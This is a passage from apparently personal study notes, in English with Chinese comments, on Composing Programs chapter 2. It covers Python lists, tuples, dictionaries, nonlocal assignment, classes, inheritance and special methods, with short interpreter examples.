class="hljs-name">expression</span>&gt;</span>.<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Objects also have <mark>methods</mark>, which are function-valued attributes.</p><p>In fact, all values in Python are objects. That is, all values have behavior and attributes. They act like the values they represent.</p><h3 id="2-4-2-Sequence-Objects"><a href="#2-4-2-Sequence-Objects" class="headerlink" title="2.4.2 Sequence Objects"></a>2.4.2 Sequence Objects</h3><p>Instances of primitive built-in values such as numbers are immutable. The values themsleves cannot change over the course of program execution.</p><p>Mutable objects are used to represent values that change over time.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">  &gt;</span><span class="language-bash">&gt;&gt; suits.pop()             <span class="hljs-comment"># Remove and return the final element</span></span><br>&#x27;myriad&#x27;<br><span class="hljs-meta prompt_">  &gt;</span><span class="language-bash">&gt;&gt; suits.remove(<span class="hljs-string">&#x27;string&#x27;</span>)  <span class="hljs-comment"># Remove the first element that equals the argument</span></span><br><span class="hljs-meta prompt_">  &gt;</span><span class="language-bash">&gt;&gt; suits.append(<span class="hljs-string">&#x27;cup&#x27;</span>)              <span class="hljs-comment"># Add an element to the end</span></span><br><span class="hljs-meta prompt_">  &gt;</span><span class="language-bash">&gt;&gt; suits.extend([<span class="hljs-string">&#x27;sword&#x27;</span>, <span class="hljs-string">&#x27;club&#x27;</span>])  <span class="hljs-comment"># Add all elements of a sequence to the end</span></span><br></code></pre></td></tr></table></figure><p>当<code>suits = chinese</code> 这里 <code>suits</code> 相当于 <code>chinese</code> 这个列表的引用, 修改 <code>suits</code> 会引起 <code>chinese</code> 的值改变.</p><p>但:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">suits</span> <span class="hljs-operator">=</span> list(chinese)<br></code></pre></td></tr></table></figure><p>就不会将二者联系在一起.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">suits.insert(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;Joker&#x27;</span>)  <span class="hljs-comment"># Insert an element at index 2, shifting the rest</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">nest[<span class="hljs-number">0</span>].pop(<span class="hljs-number">2</span>)</span><br>&#x27;Joker&#x27;<br></code></pre></td></tr></table></figure><p>To test whether two objects are the same, Python includes two comparison operator, called <mark>is</mark> and <mark>is not</mark>, that test whether two expressions in fact evaluate to the identical object.</p><p>Two onjects are identical if they are equal in their current value, and any change to one will always be reflected in the other.</p><p>区分 <code>==</code> 和 <code>is</code>.</p><p><mark>Tuples</mark><br>An instance of the built-in <code>tuple</code> type, is an immutable sequence. 使用 parentheses.</p><p>tuple也是 finite length and support element selection:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">code = (<span class="hljs-string">&quot;up&quot;</span>, <span class="hljs-string">&quot;up&quot;</span>, <span class="hljs-string">&quot;down&quot;</span>, <span class="hljs-string">&quot;down&quot;</span>) + (<span class="hljs-string">&quot;left&quot;</span>, <span class="hljs-string">&quot;right&quot;</span>) * <span class="hljs-number">2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">len</span>(code)</span><br>8<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">code[<span class="hljs-number">3</span>]</span><br>&#x27;down&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">code.count(<span class="hljs-string">&quot;down&quot;</span>)</span><br>2<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">code.index(<span class="hljs-string">&quot;left&quot;</span>)</span><br>4<br></code></pre></td></tr></table></figure><p>While it is not possible to change which elements are in a tuple, it is possible to change the value of a mutable element contained within a tuple.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nest = (<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-selector-attr">[30, 40]</span>)<br><span class="hljs-number">2</span>nest<span class="hljs-selector-attr">[2]</span><span class="hljs-selector-class">.pop</span>()<br></code></pre></td></tr></table></figure><h3 id="2-4-3-Dictionaries"><a href="#2-4-3-Dictionaries" class="headerlink" title="2.4.3 Dictionaries"></a>2.4.3 Dictionaries</h3><p>A dictionary contains key-value pairs, where both keys and values are objects.</p><p>The purpose of a dictionary is  to provide an abstraction for storing and retrieving values that are indexed not by consecutive integers, but by descriptive keys.</p><p>Adding new key-value pairs and changing the existing value for a key can both be achieved with assignment statements:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>numerals[<span class="hljs-string">&#x27;I&#x27;</span>] = <span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>numerals[<span class="hljs-string">&#x27;L&#x27;</span>] = <span class="hljs-number">50</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>numerals<br>&#123;<span class="hljs-string">&#x27;I&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;X&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;L&#x27;</span>: <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-number">5</span>&#125;<br></code></pre></td></tr></table></figure><p>Dictionaries are unordered collections of key-value pairs.</p><p>The methods <code>keys</code>, <code>values</code>, and <code>items</code> all return iterable values.</p><p>A list of key-value pairs can be converted into a dictionary by calling the <code>dict</code> constructor function:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&gt;&gt;&gt; <span class="hljs-title function_">dict</span>(<span class="hljs-params">[(<span class="hljs-number">3</span>, <span class="hljs-number">9</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">16</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">25</span>)]</span>)<br>&#123;<span class="hljs-number">3</span>: <span class="hljs-number">9</span>, <span class="hljs-number">4</span>: <span class="hljs-number">16</span>, <span class="hljs-number">5</span>: <span class="hljs-number">25</span>&#125;<br></code></pre></td></tr></table></figure><p>Restrictions:</p><ul><li>A key of a dictionary cannot be or contain a mutable value.</li><li>There can be at most one value for a given key.</li></ul><p>A  useful method implemented by dictionaries is get, which returns either the value for a key, if the key is present, or a default value. The arguments to get are the key and the default value.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">numerals.get(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0</span>)</span><br>0<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">numerals.get(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-number">0</span>)</span><br>5<br></code></pre></td></tr></table></figure><p>Dictionaries also have a comprehension syntax analogous to those of lists. A key expression and a value expression are separated by a colon. Evaluating a dictionary comprehension creates a new dictionary object.</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&gt;&gt;&gt; &#123;<span class="hljs-keyword">x</span>: <span class="hljs-keyword">x</span>*<span class="hljs-keyword">x</span> for <span class="hljs-keyword">x</span> in range(<span class="hljs-number">3</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span>)&#125;<br>&#123;<span class="hljs-number">3</span>: <span class="hljs-number">9</span><span class="hljs-punctuation">,</span> <span class="hljs-number">4</span>: <span class="hljs-number">16</span><span class="hljs-punctuation">,</span> <span class="hljs-number">5</span>: <span class="hljs-number">25</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-4-4-Local-State"><a href="#2-4-4-Local-State" class="headerlink" title="2.4.4 Local State"></a>2.4.4 Local State</h3><p>Lists and dictionaries have local state: they are changing values that have some particular contents at any point in the execution of a program.</p><p>The <code>nonlocal</code> statement indicates that the name appears somewhere in the environment other than the first(local) frame or the last(global) frame. 也就是说, 假如有个<code>test</code>变量在这个函数之外已经被定义了, 然而要在这个函数里面修改这个<code>test</code>的值, 如果<code>nonlocal test</code>, 那么这个<code>test</code>就不是函数里面的局部变量,而是外面那个.</p><p><code>nonlocal</code>用于声明外部函数的局部变量.</p><p>high-order function, 就是把需要多个参数的一个函数拆分为, 每次只需要一个参数的迭代函数.</p><p>Assignment has a dual role: they either created new bindings or re-bound existing names.</p><p>Python has an unusual restriction regarding the lookup of names: within the body of a function, all instances of a name must refer to the same frame.</p><p>Adding a <code>nonlocal</code> statement can correct the <code>UnboundLocalError: local variable &#39;balance&#39; referenced before assignment</code> error.</p><h3 id="2-4-5-The-Benefits-of-Non-Local-Assignment"><a href="#2-4-5-The-Benefits-of-Non-Local-Assignment" class="headerlink" title="2.4.5 The Benefits of Non-Local Assignment"></a>2.4.5 The Benefits of Non-Local Assignment</h3><h3 id="2-4-6-The-Cost-of-Non-Local-Assignment"><a href="#2-4-6-The-Cost-of-Non-Local-Assignment" class="headerlink" title="2.4.6 The Cost of Non-Local Assignment"></a>2.4.6 The Cost of Non-Local Assignment</h3><p>Our values did not change, only our names and bindings changed.</p><p>We must be very careful to understand the effect of a change on other names that might refer to thos  values.</p><p><mark>Only function calls</mark> can introduce new frames.</p><h3 id="2-4-7-Implementing-Lists-and-Dictionaries"><a href="#2-4-7-Implementing-Lists-and-Dictionaries" class="headerlink" title="2.4.7 Implementing Lists and Dictionaries"></a>2.4.7 Implementing Lists and Dictionaries</h3><p>Two empty lists are not identical values.</p><p>A general pattern in programming: the function is a dispatch function and its arguments are first a message, followed by additional arguments to parameterize that method.</p><p><mark>Linked list</mark>, 是链表.</p><h3 id="2-4-9-Propagating-Constraints"><a href="#2-4-9-Propagating-Constraints" class="headerlink" title="2.4.9 Propagating Constraints"></a>2.4.9 Propagating Constraints</h3><p>Mutable data allows us to simulate systems with change, but also allows us to build new kinds of abstractions.</p><p>A <mark>connector</mark> is an object that “holds” a value and may participate in one or more constraints. </p><h2 id="2-5-Object-Oriented-Programming"><a href="#2-5-Object-Oriented-Programming" class="headerlink" title="2.5 Object-Oriented Programming"></a>2.5 Object-Oriented Programming</h2><p>Objects have local state that is not directly accessible from the global environment.</p><p>Each objects bundles together local state and behavior in a way that abstracts the complexity of both.</p><p>Every object also has a type, called its <code>class</code>.</p><h3 id="2-5-1-Objects-and-Classes"><a href="#2-5-1-Objects-and-Classes" class="headerlink" title="2.5.1 Objects and Classes"></a>2.5.1 Objects and Classes</h3><p>A class serves as a template for all objects whose type is that class.</p><p>Every object is an instance of some particular class.</p><p>The syntax in Python for instantiating a class is identical to the syntax of calling a function:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&gt;&gt;&gt; <span class="hljs-variable">a</span> = <span class="hljs-function"><span class="hljs-title">Account</span>(<span class="hljs-string">&#x27;Kirk&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p>The attributes specific tot a particular object, as opposed to all objects of a class, are called <mark>instance attributes</mark>. Instance attributes may also be called field, properties, or instance variable.</p><p>Functions that operate on the object or perform object-specific computations are called <mark>methods</mark>. Methods are invoked on a particular object.</p><h3 id="2-5-2-Defining-Classes"><a href="#2-5-2-Defining-Classes" class="headerlink" title="2.5.2 Defining Classes"></a>2.5.2 Defining Classes</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> &lt;<span class="hljs-symbol">name</span>&gt;:<br>    &lt;<span class="hljs-symbol">suite</span>&gt;<br></code></pre></td></tr></table></figure><p>The method that initializes objects has a special name in Python, <code>_init_</code>, and is called the <em>constructor</em> for the class.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&gt;&gt;&gt; <span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span>:<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, account_holder</span>):<br>          <span class="hljs-variable language_">self</span>.balance = <span class="hljs-number">0</span><br>          <span class="hljs-variable language_">self</span>.holder = account_holder<br></code></pre></td></tr></table></figure><p>第一个<code>self</code>参数是 bound to the newly created object. 使用<code>self</code>是一个 convention.</p><p>第二个参数是我们传入的.</p><p>Object identity is compared using the <code>is</code> and <code>is not</code> operators.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>a <span class="hljs-keyword">is</span> a<br><span class="hljs-literal">True</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>a <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> b<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>Binding an object to a new name using assignment does not create a new object:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">c = a</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">c <span class="hljs-keyword">is</span> a</span><br>True<br></code></pre></td></tr></table></figure><p>Methods’definition:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span>:<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, account_holder</span>):<br>          self.balance = <span class="hljs-number">0</span><br>          self.holder = account_holder<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">deposit</span>(<span class="hljs-params">self, amount</span>):<br>          self.balance = self.balance + amount<br>          <span class="hljs-keyword">return</span> self.balance<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">withdraw</span>(<span class="hljs-params">self, amount</span>):<br>          <span class="hljs-keyword">if</span> amount &gt; self.balance:<br>              <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Insufficient funds&#x27;</span><br>          self.balance = self.balance - amount<br>          <span class="hljs-keyword">return</span> self.balance<br></code></pre></td></tr></table></figure><p>注意都有<code>self</code> 参数.</p><h3 id="2-5-3-Message-Passing-and-Dot-Expressions"><a href="#2-5-3-Message-Passing-and-Dot-Expressions" class="headerlink" title="2.5.3 Message Passing and Dot Expressions"></a>2.5.3 Message Passing and Dot Expressions</h3><p>Dot notation is a syntactic feature of Python that formalizes the message passing metaphor.</p><p><em>Dot expression</em>, consists of an expression, a dot, and a name.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">expression</span>&gt;</span> . <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><br></code></pre></td></tr></table></figure><p>The built-in function <code>getattr</code> will return an attribute for an object by name:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">getattr</span>(spock_account, <span class="hljs-string">&#x27;balance&#x27;</span>)</span><br>10<br></code></pre></td></tr></table></figure><p>To test whether an object has a named attribute with <code>hasattr</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hasattr</span>(spock_account, <span class="hljs-string">&#x27;deposit&#x27;</span>)<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p><em>Methods and function</em>. WWhen a method is invoked on an object, that object is implicitly passed as the first argument to the method. As a result, the object is bound to the parameter <code>self</code>.</p><p>We can call <code>deposit</code>(example in the text) in two ways: as a function and as a bound method.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">Account.deposit(spock_account, <span class="hljs-number">1001</span>)  <span class="hljs-comment"># The deposit function takes 2 arguments</span></span><br>1011<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spock_account.deposit(<span class="hljs-number">1000</span>)           <span class="hljs-comment"># The deposit method takes 1 argument</span></span><br>2011<br></code></pre></td></tr></table></figure><p>也就是说, 使用 dot operator 是自动传入<code>self</code>参数.</p><p><em>Naming Conventions</em>, 首字母大写.</p><p>Python’s convention dictates that if an attribute name starts with an underscore, it should only be accessed within methods of the class itself, rather than by users of the class.</p><h3 id="2-5-4-Class-Attributes"><a href="#2-5-4-Class-Attributes" class="headerlink" title="2.5.4 Class Attributes"></a>2.5.4 Class Attributes</h3><p>Some attribute values are shared across all objects of a given class. Such attributes are associated with the class itself, rather than any individual instance of the class. 也就是说这个 attribute 是和整个 class 关联在一起的. 使用class改变. <mark>class attributes</mark> may also be called class variables or static variables.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">Account.interest = <span class="hljs-number">0.05</span>  <span class="hljs-comment"># changing the class attribute</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spock_account.interest     <span class="hljs-comment"># changes instances without like-named instance attributes</span></span><br>0.05<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">kirk_account.interest     <span class="hljs-comment"># but the existing instance attribute is unaffected</span></span><br>0.08<br></code></pre></td></tr></table></figure><p>分有 class attribute 和 instance attribute.</p><p>Instance attributes are found before class attributes, just as local names have priority over global in an environment.</p><h3 id="2-5-5-Inheritance"><a href="#2-5-5-Inheritance" class="headerlink" title="2.5.5 Inheritance"></a>2.5.5 Inheritance</h3><p>Two classes may have similar attributes, but one represents a special case of the othor.</p><p>The terms <mark>parent class</mark> and superclass are also used for the base class, while <mark>child class</mark> is also used for the subclass.</p><h3 id="2-5-6-Using-Inheritance"><a href="#2-5-6-Using-Inheritance" class="headerlink" title="2.5.6 Using Inheritance"></a>2.5.6 Using Inheritance</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&gt;&gt;&gt; <span class="hljs-keyword">class</span> <span class="hljs-symbol">CheckingAccount</span>(<span class="hljs-symbol">Account</span>):<br></code></pre></td></tr></table></figure><p>Placing an expression that evaluates to the base class in parentheses after the class name. subclass 可以覆盖 superclass 的 attributes.</p><p>To look up a name in a class:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span> If <span class="hljs-keyword">it</span> names <span class="hljs-keyword">an</span> attribute <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> class, <span class="hljs-literal">return</span> <span class="hljs-keyword">the</span> attribute <span class="hljs-built_in">value</span>.<br><span class="hljs-number">2.</span> Otherwise, look up <span class="hljs-keyword">the</span> name <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> base class, <span class="hljs-keyword">if</span> there is <span class="hljs-literal">one</span>.<br></code></pre></td></tr></table></figure><p>An <mark>object interface</mark> is a collection of attributes and conditions on those attributes.</p><h3 id="2-5-7-Multiple-Inheritance"><a href="#2-5-7-Multiple-Inheritance" class="headerlink" title="2.5.7 Multiple Inheritance"></a>2.5.7 Multiple Inheritance</h3><p>Python supports the concept of a subclass inheriting attributes from multiple base classes, a language feature called <mark>multiple inheritance</mark>. 也就是说从多个 class 中继承.</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&gt;&gt;&gt; <span class="hljs-keyword">class</span> <span class="hljs-symbol">AsSeenOnTVAccount</span>(<span class="hljs-symbol">CheckingAccount, <span class="hljs-symbol">SavingsAccount</span></span>):<br></code></pre></td></tr></table></figure><p>在继承图中, Python resolves names from left to right, then upwards.</p><p>Python resolves this name using a recursive algorithm called the C3 Method Resolution Ordering.</p><h3 id="2-5-8-The-Role-of-Objects"><a href="#2-5-8-The-Role-of-Objects" class="headerlink" title="2.5.8 The Role of Objects"></a>2.5.8 The Role of Objects</h3><p>The Python object system is designed to make data abstraction and message passing both convenient and flexible.</p><h2 id="2-6-Implementing-Classes-and-Objects"><a href="#2-6-Implementing-Classes-and-Objects" class="headerlink" title="2.6 Implementing Classes and Objects"></a>2.6 Implementing Classes and Objects</h2><p>Programs can be object-oriented, even in programming languages that do not have a built-in object system.</p><h3 id="2-6-1-Instances"><a href="#2-6-1-Instances" class="headerlink" title="2.6.1 Instances"></a>2.6.1 Instances</h3><p>An instance has named attributes, such as the balance of an account, which can be set and retrieved.</p><h3 id="2-6-2-Classes"><a href="#2-6-2-Classes" class="headerlink" title="2.6.2 Classes"></a>2.6.2 Classes</h3><p>A class is also an object, both in Python’s object system and the system we are implementing here.</p><p>In Python, classes do have classes, almost all classes share the same class, called <code>type</code>.</p><h2 id="2-7-Object-Abstraction"><a href="#2-7-Object-Abstraction" class="headerlink" title="2.7 Object Abstraction"></a>2.7 Object Abstraction</h2><p>A central concept in object abstraction is a <mark>generic function</mark>, which is a function that can accept values of multiple different types.</p><p>Three different techniques for implementing generic functions:</p><ul><li>shared interfaces</li><li>type dispatching</li><li>type coercion</li></ul><h3 id="2-7-1-String-Conversion"><a href="#2-7-1-String-Conversion" class="headerlink" title="2.7.1 String Conversion"></a>2.7.1 String Conversion</h3><p>Python simulates that all objects should produce two different string representations:</p><ul><li>humen-interpretable text</li><li>Python-interpretable expression<br>The constructor <code>str</code> returns a human-readable string. The <code>repr</code> function returns a Python expression that evaluates to an equal object.<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> date</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">tues = date(<span class="hljs-number">2011</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">repr</span>(tues)</span><br>&#x27;datetime.date(2011, 9, 12)&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">str</span>(tues)</span><br>&#x27;2011-09-12&#x27;<br></code></pre></td></tr></table></figure>The <code>repr</code> function always invokes a method called <code>_repr_</code> on its argument:<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&gt;&gt;&gt; tues.__repr__()<br>&#x27;datetime.date(<span class="hljs-number">2011</span>, 9, 12)&#x27;<br></code></pre></td></tr></table></figure>The <code>str</code> function always invokes a method called <code>_str_</code> on its argument:<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&gt;&gt;&gt; tues.__str__()<br>&#x27;<span class="hljs-number">2011-09-12</span>&#x27;<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-7-2-Special-Methods"><a href="#2-7-2-Special-Methods" class="headerlink" title="2.7.2 Special Methods"></a>2.7.2 Special Methods</h3><p>In Python, certain special names are invoked by the Python interpreter in special circumstances. For example, the <code>_init_</code> method of a class is automatically invoked whenever an object is constructed.</p><p>定义<code>_bool_</code>来判断一个object的 true or false.</p><p>The <code>len</code> function invokes the <code>_len_</code> method of its argument to determine its length.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;Go Bears!&#x27;</span>._len_()</span><br>9<br></code></pre></td></tr></table></figure><p>Python uses a sequence’s length to determine its truth value, if it does not provide a <code>_bool_</code> method. Empty sequences are false, while non-empty sequences are true:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">bool</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-literal">False</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">bool</span>([])<br><span class="hljs-literal">False</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">bool</span>(<span class="hljs-string">&#x27;Go Bears!&#x27;</span>)<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>The <code>_getitem_</code> method is invoked by the element selection operator, but it can also be invoked directly:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;Go Bears!&#x27;</span>[<span class="hljs-number">3</span>]<br><span class="hljs-string">&#x27;B&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;Go Bears!&#x27;</span>.__getitem__(<span class="hljs-number">3</span>)<br><span class="hljs-string">&#x27;B&#x27;</span><br></code></pre></td></tr></table></figure><p>Using <code>_call_</code> method we can define a class that behaves like functions:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&gt;&gt;&gt; <span class="hljs-keyword">class</span> <span class="hljs-title class_">Adder</span>(object):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, n</span>):<br>            <span class="hljs-variable language_">self</span>.n = n<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, k</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.n + k<br><br>&gt;&gt;&gt; add_three_obj = Adder(<span class="hljs-number">3</span>)<br>&gt;&gt;&gt; add_three_obj(<span class="hljs-number">4</span>)<br><span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><h3 id="2-7-3-Multiple-Representations"><a href="#2-7-3-Multiple-Representations" class="headerlink" title="2.7.3 Multiple Representations"></a>2.7.3 Multiple Representations</h3><p>How numbers can be added or multiplied is abstracted by the method names add and mul:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&gt;&gt;&gt; <span class="hljs-keyword">class</span> <span class="hljs-title class_">Number</span>:<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, other</span>):<br>          <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.add(other)<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span 